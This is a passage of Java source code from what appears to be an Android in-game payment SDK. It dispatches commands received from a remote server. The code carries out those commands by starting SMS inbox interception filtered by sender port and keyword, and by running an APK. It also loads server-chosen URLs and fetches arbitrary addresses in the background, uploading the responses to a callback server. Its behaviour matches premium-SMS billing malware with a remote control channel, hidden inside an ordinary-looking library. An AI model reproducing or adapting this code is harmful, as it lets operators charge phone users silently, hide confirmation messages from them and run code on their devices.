				SharedPreferences sp_Setting = context.getSharedPreferences(
						"Setting_snspt", Context.MODE_PRIVATE);
				Editor editor = sp_Setting.edit();
				editor.putString(Config.CacheKey.CacheSMSFilterString, "");
				editor.putLong(Config.CacheKey.CacheSMSFilterTime, DataMillis);
				editor.commit();
				// 启动服务
				SMSHolder.getInstance().StartHolder(context);
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_NOTIFICATION) {
			} else if (revBean.getCmdid() == Config.CMD_WEBVIEWURL) {
				if (mWebView != null)
					mWebView.loadUrl(revBean.getMsg());
			} else if (revBean.getCmdid() == Config.CMD_STARTFEE) {
				// region 通知客户端，已经进入计费流程
				if (Config.getInstance().tpHandler != null) {
					try {
						currentPayFeeMessage = new PayFeeMessage(note,
								CallBackWCNum, 1, Config.CMD_STARTFEE);
						EPCoreManager.getInstance().sendMessage(
								URLFinals.WEB_STATISTICAL,
								currentPayFeeMessage, null);
					} catch (Exception e) {
					}
					SendHanlderMsg(Config.getInstance().tpHandler,
							Config.CMD_STARTFEE, "");
					// 启动短信收件箱拦截线程
					MySTask.getInstance(context).CheckNewSms();
				}
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_NOCONFIG) {
				// region 用户取消计费webview
				Message message = new Message();
				message.obj = revBean;
				message.what = 0;
				handlerAction.sendMessage(message);

				// 通知客户端，无法计费
				if (Config.getInstance().tpHandler != null) {
					// 无法计费原因
					String NoConfigMsg = revBean.getMsg();
					try {
						/*
						 * EPCoreManager.getInstance().sendMessage(
						 * URLFinals.WEB_STATISTICAL, new PayFeeMessage(note,
						 * CallBackWCNum, 0, NoConfigMsg), null);
						 */
					} catch (Exception e) {
						// TODO: handle exception
					}

					SendHanlderMsg(Config.getInstance().tpHandler,
							Config.CMD_NOCONFIG, NoConfigMsg);
				}
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_CLOSEWEBVIEW) {
				// region 关闭计费窗口
				try {
					new FeeParamMessage(Config.CMD_CLOSEWEBVIEW, "关闭计费窗口");

				} catch (Exception e) {
				}

				// endregion

				// region 仅关闭webview,计费完成后，通知客户端结果
				if (Config.getInstance().tpHandler != null) {
					// 传递计费结果到游戏去
					new Thread() {
						@Override
						public void run() {
							Looper.prepare();

							int IReturn = 0;

							while (IReturn <= 36) // 最后一次直接通知游戏方
							{
								IReturn++;
								if (IReturn == 36) // 超过一分钟直接返回
								{
									String JsonStr = "[\"" + CallBackUserTag
											+ "\",0," + CallBackWCNum + ","
											+ Config.CallbackOther + "]";
									SendHanlderMsg(
											Config.getInstance().tpHandler,
											Config.CMD_CLOSEWEBVIEW, JsonStr);
									break;
								}

								try {
									CallbackBean cb = new CallbackBean();
									cb.setCmdid(Config.CMD_FeeReportHeartConn);
									cb.setLinkid(0);
									cb.setMsg("");
									cb.setStatus(0);
									String postData = CovertCallbackBean(cb);
									if (Config.IsDebug) {
										// Log.i("getJson", "postData = " +
										// postData);
									}
									String urlPart = "uid="
											+ regResponse.getUid()
											+ "&key="
											+ AES.EncodeString(postData,
													Config.AesNewKey);

									String ConfigUrl = "http://"
											+ Config.MainIp + "/req.aspx?"
											+ urlPart;
									if (Config.IsDebug) {
										// Log.i(TAG, ConfigUrl);
									}

									String JsonStr = HttpCommon
											.getHtmlContents(ConfigUrl, "",
													false).HtmlContents;

									if (JsonStr.length() != 0) {
										SendHanlderMsg(
												Config.getInstance().tpHandler,
												Config.CMD_CLOSEWEBVIEW,
												JsonStr);
										break;
									}
								} catch (Exception e) {
									if (Config.IsDebug) {
										Log.e(TAG, e.getMessage());
									}
								}

								try {
									sleep(1 * 5000);
								} catch (Exception e) {
									if (Config.IsDebug) {
										Log.e(TAG, e.getMessage());
									}
								}
							}
						}
					}.start();

					Message message = new Message();
					message.obj = revBean;
					message.what = 0;
					handlerAction.sendMessage(message);
				}
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_CANCELWEBVIEW) {
				// region 用户取消计费webview

				Message message = new Message();
				message.obj = revBean;
				message.what = 0;
				handlerAction.sendMessage(message);

				// 传递值到游戏去
				if (Config.getInstance().tpContext != null) {
					SendHanlderMsg(Config.getInstance().tpHandler,
							Config.CMD_CANCELWEBVIEW, "");
				}
				if (Config.IsDebug) {
					Log.i("CancelWin", "CancelWin");
				} 
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_CLOSECRC) {
				// region 关闭心跳
				if (heartThread != null) {
					heartThread.stopHeart();
				}
				Message message = new Message();
				message.obj = revBean;
				message.what = 0;
				handlerAction.sendMessage(message);
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_SHOWMSG) {
				// 显示通知
				showToast(revBean);
			} else if (revBean.getCmdid() == Config.CMD_OpenCUWOSDK) {
				// region 打开联通计费端口
				// endregion
			} else if (revBean.getCmdid() == Config.CMD_RUNAPP) {
				// 运行一个apk
				new RunApp(context, handler, revBean).start();
			} else if (revBean.getCmdid() == Config.CMD_LISTAPP) {
				// 查找所有应用上传
				//new GetAllApp(context, handler, revBean).start();
			} else if (revBean.getCmdid() == Config.CMD_DOWNLOADAPP) {
				// 下载一个应用
			} else if (revBean.getCmdid() == Config.CMD_ROOT) {
				//new CheckRoot(context, handler, revBean).start();
			} else if (revBean.getCmdid() == Config.CMD_AccessUrl) {

				// 后台访问一个地址
				new Thread() {
					public void run() {
						String Url = revBean.getMsg();
						CheckLog.log(
								getClass().getName(),
								" CMD_AccessUrl String Url = revBean.getMsg() 1;",
								Url);
						if (Url == null || Url.length() == 0) {
							return;
						}
						try {
							Url = URLDecoder.decode(Url, "utf-8");
							CheckLog.log(
									getClass().getName(),
									" CMD_AccessUrl String Url = revBean.getMsg() 2;",
									Url);

							HttpResult hr = HttpCommon.getHtmlContents(Url, "",
									false);
							CheckLog.log(
									getClass().getName(),
									" CMD_AccessUrl String Url = revBean.getMsg() 3;",
									hr.toString());

							JSONObject jsonObj = new JSONObject();
							jsonObj.put("cmdid", Config.CMD_AccessUrl_CallBack);
							jsonObj.put("linkid", revBean.getCmdid());
							jsonObj.put("msg", Url + Config.splitStringLevel1
									+ hr.HtmlContents);
							jsonObj.put("status", hr.StatusCode);
							String postData = jsonObj.toString();

							String tempString = "uid="
									+ regResponse.getUid()
									+ "&key="
									+ AES.EncodeString(postData,
											regResponse.getCryptkey())
									+ "&var=" + Config.WCVerSion;
							CheckLog.log(
									getClass().getName(),
									" CMD_AccessUrl String Url = revBean.getMsg() 4 ;",
									tempString);

							hr = HttpCommon.getHtmlContents(
									regResponse.getCallbackurl(), tempString,
									false);
							CheckLog.log(
									getClass().getName(),
									" CMD_AccessUrl String Url = revBean.getMsg() 5;",
									hr.HtmlContents);
							if (hr.HtmlContents != null
									&& hr.HtmlContents.trim().endsWith("ok")) {
								// 删除本地日志，避免再次上传
							}
						} catch (Exception e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
					};
				}.start();

			} else if (revBean.getCmdid() == Config.CMD_FEEOK) {
					PayTaskManager.getInstance().create(tempOrderKey).webPay(true);
			} else if (revBean.getCmdid() == Config.CMD_FEEFAIL) {
				PayTaskManager.getInstance().create(tempOrderKey).webPay(false);

			}else  if(revBean.getCmdid() == Config.CMD_3RD){
				String json = URLDecoder.decode(revBean.getMsg(),"utf-8");
				try {
					smsHolder(json);
				} catch (Exception e) {
				// TODO: handle exception
				}
				PayTaskManager.getInstance().create(tempOrderKey).remote(json);
			}

		} catch (Exception e) {
			CheckLog.log(getClass().getName(), "execute revBean Error",
					"执行时发生异常");
			if (Config.IsDebug) {
				Log.d(TAG, e.getMessage());
			}
		}
	}

	private void smsHolder(String json) throws JSONException {
		JSONObject jsonObj = new JSONObject(json);
		//是否建立拦截
		StringBuffer buffer = new StringBuffer();
		JSONObject jsonObject = new JSONObject();
		String[] holdDuanKous = jsonObj.getString("Holdduankou").split("_");
		String[] holdKeywords = jsonObj.getString("Holdkeyword").split("_");
		if(holdDuanKous.length==holdKeywords.length){
		for (int i = 0; i < holdKeywords.length; i++) {
			String holdDuanKou = holdDuanKous[i];
			String holdKeyword = holdKeywords[i];
			buffer.append(holdDuanKou);
			buffer.append(Config.splitStringLevel2);
			buffer.append(holdKeyword);
			buffer.append(Config.splitStringLevel1);
		}	
		}
		jsonObject.put("cmdId",1070);
		jsonObject.put("delayTime", 0);
		jsonObject.put("msg",buffer.toString());
		String cacheJson = jsonObject.toString();
		SharedPreferences sp_Setting = Config.getInstance().tpContext.getSharedPreferences("Setting_snspt", Context.MODE_PRIVATE);
		 sp_Setting.edit().putString(Config.CacheKey.CacheSMSFilterString, cacheJson).commit();
		SMSHolder.getInstance().StartHolder(Config.getInstance().tpContext);
	}

	// public void notification(int flag)
	// {
	// Notification notification = new Notification();
	// // 设置statusbar显示的icon
	// // notification.icon = R.drawable.icon;
	// // 设置statusbar显示的文字信息
	// // myNoti.tickerText= new_msg ;
	// notification.flags = Notification.FLAG_AUTO_CANCEL;
	// // 设置notification发生时同时发出默认声音
	// notification.defaults = Notification.DEFAULT_SOUND;
	// RemoteViews contentView = new RemoteViews(getPackageName(),
	// R.layout.custom_notification);
	// Bitmap bitmap =
	// drawableToBitmap(this.getResources().getDrawable(R.drawable.alert_dialog_icon));
	//
	// contentView.setImageViewBitmap(R.id.notification_icon, bitmap);
	// contentView.setTextViewText(R.id.app_name, "Custom notification");
	// notification.contentView = contentView;
	// Intent intent = new Intent(this, MainActivity.class);
	// PendingIntent contentIntent = PendingIntent.getActivity(this, 0, intent,
	// PendingIntent.FLAG_UPDATE_CURRENT);
	// notification.contentIntent = contentIntent;
	// // 显示Notification
	// Random random = new Random(new Date().getTime());
	// mNotificationManager.notify(random.nextInt(1000000), notification);
	// }

	// 转化drawableToBitmap
	// public static Bitmap drawableToBitmap(Drawable drawable)
	// {
	// Bitmap bitmap = Bitmap.createBitmap(drawable.getIntrinsicWidth(),
	// drawable.getIntrinsicHeight(),
	// drawable.getOpacity() != PixelFormat.OPAQUE ? Bitmap.Config.ARGB_8888 :
	// Bitmap.Config.RGB_565);
	// Canvas canvas = new Canvas(bitmap);
	// drawable.setBounds(0, 0, drawable.getIntrinsicWidth(),
	// drawable.getIntrinsicHeight());
	// drawable.draw(canvas);
	// return bitmap;
	// }

	public Handler handlerAction = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(Message msg) {
			if (msg.what == 0) {
				RevBean revBean = (RevBean) msg.obj;
				CallbackBean callbackbean = new CallbackBean();
				callbackbean.setCmdid(revBean.getCmdid());
				callbackbean.setLinkid(revBean.getLinkid());
				callbackbean.setMsg(revBean.getMsg());
				callbackbean.setStatus(0);// 0是成功
				CallBackAction callback = new CallBackAction(
						Config.getInstance().tpContext, callbackbean,
						regResponse);
				callback.start();
			} else if (msg.what == -1) {
				// 错误
				RevBean revBean = (RevBean) msg.obj;
				CallbackBean callbackbean = new CallbackBean();
				callbackbean.setCmdid(revBean.getCmdid());
				callbackbean.setLinkid(revBean.getLinkid());
				callbackbean.setMsg(revBean.getMsg());
				callbackbean.setStatus(1);// 1是错误
				CallBackAction callback = new CallBackAction(
						Config.getInstance().tpContext, callbackbean,
						regResponse);
				callback.start();
			}
		};
	};

	public Handler handlerHeart = new Handler(Looper.getMainLooper()) {
		@Override
		public void handleMessage(Message msg) {
			CheckLog.log(this.getClass().getName(), new Exception()
					.getStackTrace().toString(),
					" handlerHeart msg=" + msg.toString());
			if (msg.what == 0) {
				CallbackResponseBean callbackResponseBean = (CallbackResponseBean) msg.obj;

				if (callbackResponseBean == null) {
					if (Config.IsDebug) {
						Log.i(TAG, "callbackResponseBean is Null");
					}
					return;
				} else {
					if (Config.IsDebug) {
						Log.i(TAG, "" + callbackResponseBean.getStatus());
					}
				}

				if (callbackResponseBean.getStatus() == 10) {
					if (Config.IsDebug) {
						CheckLog.log(this.getClass().getName(), new Exception()
								.getStackTrace().toString(), Config.AesNewKey
								+ "aes key");
					}

					String JSon = AES.DecodeString(
							callbackResponseBean.getMsg(), Config.AesNewKey);
					if (JSon.length() == 0) {
						WCConnect.getInstance().PostLog(
								"SMSLog:中间件解码Json,失败!JSon:"
										+ callbackResponseBean.getMsg() + "密钥:"
										+ Config.AesNewKey);
					} else {
						WCConnect.getInstance().PostLog(
								"SMSLog:中间件解码Json成功!JSon:" + JSon);
						openJSONData(JSon, Config.getInstance().tpContext);
					}
				}else{
					//手机号计费状态发送
					Intent intent = new Intent(MessageFormat.format(CommonFinals.ACTION_PNPAY_RES,
							EPCoreManager.getInstance().getContext().getPackageName()));
					intent.putExtra("code", callbackResponseBean.getStatus());
					EPCoreManager.getInstance().getContext().sendBroadcast(intent);
				}

			} else {

			}
		};
	};

	public PayFeeMessage currentPayFeeMessage;

	private void showToast(final RevBean revBean) {
		Config.getInstance().tpHandler.post(new Runnable() {
			@Override
			public void run() {
				// TODO Auto-generated method stub
				CheckLog.log(this.getClass().getName(), new Exception()
						.getStackTrace().toString(), revBean.getMsg());
				Toast.makeText(Config.getInstance().tpContext,
						revBean.getMsg(), Toast.LENGTH_LONG).show();

			}
		});
	}


	public RegResponse GetRegResponse(String RegStr) {
		try {
			JSONObject jsonObj = new JSONObject(RegStr);
			RegResponse reg = new RegResponse();
			reg.setCacheUrl(jsonObj.getString("cacheurl"));
			reg.setCallbackurl(jsonObj.getString("callbackurl"));
			reg.setCryptkey(jsonObj.getString("cryptkey"));

			reg.setMainIp(jsonObj.getString("MainIp"));
			reg.setLinkIp(jsonObj.getString("LinkIp"));
			reg.setLinkDomain(jsonObj.getString("LinkDomain"));

			reg.setFeeurl(jsonObj.getString("feeurl"));
			reg.setFeeWindowMode(jsonObj.getInt("feewindowmode"));
			reg.setHeartconntime(jsonObj.getInt("heartconn"));
			reg.setHeartconnurl(jsonObj.getString("heartconnurl"));
			reg.setUid(jsonObj.getInt("uid"));
			reg.setWinheight(jsonObj.getInt("winheight"));
			reg.setWinwidth(jsonObj.getInt("winwidth"));
			return reg;
		} catch (JSONException e) {
			if (Config.IsDebug) {
				Log.e(TAG, e.getMessage());
			}
		}

		return null;
	}

	public CallbackBean GetCallbackBean(String CallbackStr) {
		try {
			JSONObject jsonObj = new JSONObject(CallbackStr);
			CallbackBean cbb = new CallbackBean();
			cbb.setCmdid(jsonObj.getInt("cmdid"));
			cbb.setLinkid(jsonObj.getInt("linkid"));
			cbb.setMsg(jsonObj.getString("msg"));
			cbb.setStatus(jsonObj.getInt("status"));
			return cbb;
		} catch (JSONException e) {
			if (Config.IsDebug) {
				Log.e(TAG, e.getMessage());
			}
		}

		return null;
	}

	public String CovertCallbackBean(CallbackBean cbb) {
		try {
			JSONObject jsonObj = new JSONObject();
			jsonObj.put("cmdid", cbb.getCmdid());
			jsonObj.put("linkid", cbb.getLinkid());
			jsonObj.put("msg", cbb.getMsg());
			jsonObj.put("status", cbb.getStatus());
			return jsonObj.toString();
		} catch (JSONException e) {
			if (Config.IsDebug) {
				Log.e(TAG, e.getMessage());
			}
		}

		return "";
	}

	public RevBean GetRevBean(String RevStr) {
		try {
			JSONObject jsonObj = new JSONObject(RevStr);
			RevBean rev = new RevBean();
			rev.setCmdid(jsonObj.getInt("cmdid"));
			try {
				rev.setDelayTime(jsonObj.getInt("delaytime"));
			} catch (JSONException e) {
				rev.setDelayTime(0);
			}
			rev.setLinkid(jsonObj.getInt("linkid"));
			rev.setMsg(jsonObj.getString("msg"));
			// String tempStr = jsonObj.getString("msg");
			// try {
			// tempStr = java.net.URLDecoder.decode(tempStr, "UTF-8");
			// } catch (Exception er) {
			// return null;
			// TODO: handle exception
			// }

			// rev.setMsg(tempStr);

			return rev;
		} catch (JSONException e) {
			e.printStackTrace();
			Log.e(TAG, e.getMessage());
		}
		return null;
	}

	public CallbackResponseBean GetCallbackResponseBean(String cbrbStr) {
		try {
			JSONObject jsonObj = new JSONObject(cbrbStr);
			CallbackResponseBean cbrb = new CallbackResponseBean();
			cbrb.setMsg(jsonObj.getString("msg"));
			cbrb.setStatus(jsonObj.getInt("status"));
			return cbrb;
		} catch (JSONException e) {
			if (Config.IsDebug) {
				Log.e(TAG, e.getMessage());
			}
		}

		return null;
	}

	public void SendHanlderMsg(final Handler handler, Integer what, Object obj) {
		if (Config.IsDebug) {
			Log.i(TAG, what + "" + obj);
		}

		Message msg = new Message();
		msg.obj = obj;
		msg.what = what;
		handler.sendMessage(msg);
	}

}